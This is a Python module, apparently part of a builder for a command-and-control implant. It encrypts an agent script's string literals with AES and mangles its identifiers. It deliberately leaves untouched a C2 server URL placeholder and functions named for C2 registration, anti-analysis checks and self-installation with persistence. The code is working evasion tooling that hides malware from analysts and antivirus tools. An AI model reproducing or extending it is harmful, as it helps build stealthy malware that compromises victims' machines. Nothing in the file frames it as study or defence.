# strategies/obfuscation.py

import ast
import random
import string
from rich.console import Console
from .base import BuildContext, ObfuscationStrategy
from .string_obfuscator import SessionObfuscator

console = Console()


class StringObfuscatorTransformer(ast.NodeTransformer):

    def __init__(self, session_obfuscator: SessionObfuscator):
        super().__init__()
        self.session_obfuscator = session_obfuscator
        self.obfuscation_enabled = True
        self.strings_to_ignore = {
            "%%C2_SERVER_URL%%", "%%C2_PROFILE%%", "%%DEBUG_MODE%%",
            "utf-8", "w", "r", "a", "rb", "wb", "__main__",
        }

    def visit_JoinedStr(self, node):
        """Desliga ofuscação dentro de f-strings para não quebrar a sintaxe."""
        self.obfuscation_enabled = False
        node = self.generic_visit(node)
        self.obfuscation_enabled = True
        return node

    def visit_Constant(self, node):
        if (
            self.obfuscation_enabled
            and isinstance(node.value, str)
            and node.value not in self.strings_to_ignore
            and len(node.value) > 2
        ):
            iv_b64, encrypted_data_b64 = self.session_obfuscator.obfuscate(node.value)
            call_node = ast.Call(
                func=ast.Name(id='rs', ctx=ast.Load()),
                args=[
                    ast.Constant(value=encrypted_data_b64),
                    ast.Constant(value=iv_b64)
                ],
                keywords=[]
            )
            return ast.copy_location(call_node, node)
        return node


class NameObfuscatorTransformer(ast.NodeTransformer):

    def __init__(self):
        self.name_map = {}
        self.protected_names = {
            'rs', '_init_decrypt', '_MASTER_KEY', '_DECRYPT_CACHE',
            'initialize_globals', 'main_loop', 'register_with_c2',
            'send_result', 'get_task', 'write_internal_log',
            'anti_analysis_checks', 'self_install_and_persist',
            'get_authenticated_headers', 'encrypt_data', 'decrypt_data'
        }

    def build_name_map(self, tree):
        """Constrói o mapa de renomeação apenas para definições de nível global."""
        for node in ast.iter_child_nodes(tree):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
                name = node.name
                if name not in self.protected_names and not name.startswith('__'):
                    self.name_map[name] = '_p_' + ''.join(
                        random.choices(string.ascii_lowercase, k=10)
                    )

    def visit_Name(self, node: ast.Name) -> ast.Name:
        if node.id in self.name_map:
            node.id = self.name_map[node.id]
        return node

    def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:
        if node.name in self.name_map:
            node.name = self.name_map[node.name]
        self.generic_visit(node)
        return node

    # Cobertura para async def
    visit_AsyncFunctionDef = visit_FunctionDef

    def visit_ClassDef(self, node: ast.ClassDef) -> ast.ClassDef:
        if node.name in self.name_map:
            node.name = self.name_map[node.name]
        self.generic_visit(node)
        return node


class StringObfuscationStrategy(ObfuscationStrategy):

    def execute(self, context: BuildContext) -> BuildContext:
        source_code = context.entry_script_path.read_text(encoding="utf-8")
        tree = ast.parse(source_code)

        session_obfuscator = SessionObfuscator()
        transformer = StringObfuscatorTransformer(session_obfuscator)
        obfuscated_tree = transformer.visit(tree)

        # Parseia o código de descriptografia com indentação limpa
        decrypt_code = session_obfuscator.get_decrypt_function_code()
        decrypt_tree = ast.parse(decrypt_code)

        # Encontra o ponto de inserção: logo após o último import
        insert_pos = 0
        for i, node in enumerate(obfuscated_tree.body):
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                insert_pos = i + 1
            elif not isinstance(node, (ast.Expr, ast.Constant)):
                break

        # Injeta apenas nós que não sejam imports duplicados (base64, Cryptodome)
        existing_imports = {
            (n.names[0].name if isinstance(n, ast.Import) else n.module)
            for n in obfuscated_tree.body
            if isinstance(n, (ast.Import, ast.ImportFrom))
        }
        nodes_to_inject = [
            n for n in decrypt_tree.body
            if not (
                isinstance(n, (ast.Import, ast.ImportFrom))
                and (
                    getattr(n, 'module', None) in existing_imports
                    or (isinstance(n, ast.Import) and n.names[0].name in existing_imports)
                )
            )
        ]

        for node in reversed(nodes_to_inject):
            obfuscated_tree.body.insert(insert_pos, node)

        # Injeta a chamada de inicialização
        init_call = ast.Expr(value=ast.Call(
            func=ast.Name(id='_init_decrypt', ctx=ast.Load()),
            args=[ast.Constant(value=session_obfuscator.get_master_key_b64())],
            keywords=[]
        ))
        obfuscated_tree.body.insert(insert_pos + len(nodes_to_inject), init_call)

        ast.fix_missing_locations(obfuscated_tree)
        context.entry_script_path.write_text(
            ast.unparse(obfuscated_tree), encoding="utf-8"
        )

        strings_count = sum(
            1 for n in ast.walk(obfuscated_tree)
            if isinstance(n, ast.Call)
            and isinstance(n.func, ast.Name)
            and n.func.id == 'rs'
        )
        context.log(f"StringObfuscation: {strings_count} strings ofuscadas.")
        console.print(f"[bold cyan]  → {strings_count} strings ofuscadas com AES-256-CBC.[/bold cyan]")
        return context


class IdentifierManglingStrategy(ObfuscationStrategy):

    def execute(self, context: BuildContext) -> BuildContext:
        source_code = context.entry_script_path.read_text(encoding="utf-8")
        tree = ast.parse(source_code)

        transformer = NameObfuscatorTransformer()
        transformer.build_name_map(tree)
        obfuscated_tree = transformer.visit(tree)

        ast.fix_missing_locations(obfuscated_tree)
        context.entry_script_path.write_text(
            ast.unparse(obfuscated_tree), encoding="utf-8"
        )

        count = len(transformer.name_map)
        context.log(f"IdentifierMangling: {count} identificadores renomeados.")
        console.print(f"[bold cyan]  → {count} identificadores renomeados.[/bold cyan]")
        return context
